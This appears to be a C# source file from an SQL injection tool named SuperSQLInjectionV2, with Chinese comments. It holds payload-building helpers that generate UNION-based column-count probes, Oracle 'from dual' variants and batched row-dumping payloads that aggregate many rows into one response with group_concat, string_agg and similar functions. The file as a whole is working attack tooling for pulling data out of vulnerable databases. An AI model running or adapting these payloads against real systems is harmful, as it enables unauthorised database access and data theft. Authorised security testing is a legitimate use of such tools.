using SuperSQLInjectionV2.Tools;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using static System.Runtime.InteropServices.JavaScript.JSType;

namespace SuperSQLInjectionV2.Payload
{
    public abstract class BasePayloadTool
    {
        /// <summary>
        /// 生成dump行数据的WHERE过滤片段（where 能力）：
        /// 自动剥离用户误写的where/and前缀；andStyle=true时输出" and (条件)"（模板内已有where子句，如Oracle rownum），
        /// 否则输出" where 条件 "；空条件返回空串
        /// </summary>
        /// <summary>
        /// Union批量取数payload（Q3）：用聚合函数（group_concat/string_agg/LISTAGG/FOR XML）把 rowCount 行拼成单行一次回显，
        /// 每行自带 DataStartStr/DataEndStr 标记，客户端按标记切块还原各行，k行数据从k次请求压到1次。
        /// 命名槽位：{cols}=行表达式 {db}=库 {table}=表 {rowIndex}=起始行0基 {where}=where {batchSize}=批量行数 {fill}=外层填充列串(数据位=sqli_agg)。
        /// 模板未配置（UnionDataRows为空）或rowCount&lt;=1时回退逐行UnionData。
        /// 注意：聚合容量有限（如MySQL group_concat_max_len默认1024），截断时取数侧按实际块数推进并回退逐行。
        /// </summary>
        public static string UnionDataRows(IDbDialect tool, DumpDataParam dp, int rowCount)
        {
            BasePayload bp = PayloadFactory.BasePayload;
            if (bp == null || string.IsNullOrWhiteSpace(bp.UnionDataRows) || rowCount <= 1)
            {
                return tool.UnionData(dp);
            }
            List<string> newColumns = ConcatColumns(dp.Columns, bp.IFNull, dp.NoCast ? "" : bp.Cast);
            string rowExpr = tool.ConcatData(newColumns);
            //外层select列表：数据位放聚合结果别名sqli_agg，其余列填充优先级：人工/记录值 > 模板UnionFillStr
            string outerFill = string.IsNullOrWhiteSpace(dp.UnionFill) ? bp.UnionFillStr : dp.UnionFill;
            string outerCols = InsertUnionDataToShowIndex("sqli_agg", dp.SumCount, dp.ShowIndex, outerFill);
            return TemplateRenderer.Render(WithoutDbQualifier(bp.UnionDataRows, dp.DBName),
                ("cols", rowExpr), ("db", dp.DBName), ("table", dp.TableName),
                ("rowIndex", dp.DataIndex), ("where", WhereSql(dp.Where, false)),
                ("batchSize", rowCount), ("fill", outerCols));
        }

        public static string WhereSql(string? where, bool andStyle)
        {
            if (string.IsNullOrWhiteSpace(where))
            {
                return "";
            }
            string w = where.Trim();
            if (w.StartsWith("where ", StringComparison.OrdinalIgnoreCase))
            {
                w = w.Substring(6).Trim();
            }
            if (w.StartsWith("and ", StringComparison.OrdinalIgnoreCase))
            {
                w = w.Substring(4).Trim();
            }
            if (w.Length == 0)
            {
                return "";
            }
            return andStyle ? " and (" + w + ")" : " where " + w + " ";
        }

        private static readonly System.Text.RegularExpressions.Regex DbQualifierRegex =
            new System.Text.RegularExpressions.Regex("[`\"\\[]?\\{db\\}[`\"\\]]?(?:\\.\\.?|:)", System.Text.RegularExpressions.RegexOptions.Compiled | System.Text.RegularExpressions.RegexOptions.IgnoreCase);

        /// <summary>
        /// 库名为空时从模板剥离库限定段（MySQL `{db}`. / SQLServer [{db}].. / Informix {db}: / 通用 {db}.），
        /// 避免生成 ``.`table`、[]..[table] 这类非法SQL；表名改由注入点当前库上下文解析。
        /// Access/SQLite模板本身无{db}限定段，调用安全无副作用
        /// </summary>
        public static string WithoutDbQualifier(string template, string dbName)
        {
            if (string.IsNullOrWhiteSpace(dbName))
            {
                return DbQualifierRegex.Replace(template, "");
            }
            return template;
        }

        public static List<string> ConcatColumns(List<string> columns, string nullTemplate,string castTemplate)
        {
            List<string> nList = AddFunction(columns, nullTemplate);
            List<string> cList = AddFunction(nList, castTemplate);
            return cList;
        }
        public static List<string> AddFunction(List<string> columns, string fun)
        {
            List<string> newColumns = new();
            if (columns != null && columns.Count > 0)
            {
                columns.ForEach(x => {
                    if (columns.Count > 1 && !string.IsNullOrEmpty(fun))
                    {
                        string data = TemplateRenderer.Render(fun, ("expr", x));
                        newColumns.Add(data);
                    }
                    else
                    {
                        //单列或函数模板为空时必须保留原列，否则列被丢弃导致union拼接出空列（concat_ws(...,,...)）
                        newColumns.Add(x);
                    }

                });
            }

            return newColumns;
        }

    

        public static List<string> ConcatColumns(string column, string nullTemplate, string castTemplate)
        {
            List<string> list = new List<string> { column };
            return ConcatColumns(list, nullTemplate, castTemplate);
        }

        public static string InsertUnionDataToShowIndex(string data,int sumCount,int showIndex,string fillStr)
        {
            StringBuilder sb = new StringBuilder();

            if (sumCount > 0)
            {

                for (int i = 1; i <= sumCount; i++)
                {
                    if (i == showIndex)
                    {
                        sb.Append(data + ",");
                    }
                    else
                    {
                        sb.Append(fillStr + ",");
                    }
                }
                sb.Remove(sb.Length - 1, 1);
            }
            return sb.ToString();
        }


        public static string UnionColumnCountTest(int maxColumn, string fill)
        {
            StringBuilder sb = new StringBuilder(" 1=2 union all select ");
            for (int i = 1; i <= maxColumn; i++)
            {
                sb.Append(fill + "+" + i + ",");
            }
            sb.Remove(sb.Length - 1, 1);
            return sb.ToString();
        }

        public static string UnionColumnCountTestByOracle(int maxColumn, string fill)
        {
            StringBuilder sb = new StringBuilder(" 1=2 union all select ");
            for (int i = 1; i <= maxColumn; i++)
            {
                sb.Append(fill + ",");
            }
            sb.Remove(sb.Length - 1, 1);
            return sb.ToString ()+ " from dual";
        }

        public static string UnionColumnCountTestByOracle(int maxColumn, int testIndex, string fill)
        {

            return UnionColumnCountTest(maxColumn, testIndex, fill) + " from dual";
        }


        public static string UnionColumnCountTest(int maxColumn, int testIndex, string fill)
        {
            StringBuilder sb = new StringBuilder(" 1=2 union all select ");
            for (int i = 1; i <= maxColumn; i++)
            {
                if (i == testIndex)
                {
                    sb.Append(fill + ",");
                }
                else
                {
                    sb.Append("null" + ",");
                }
            }
            sb.Remove(sb.Length - 1, 1);
            return sb.ToString();
        }



    }
}
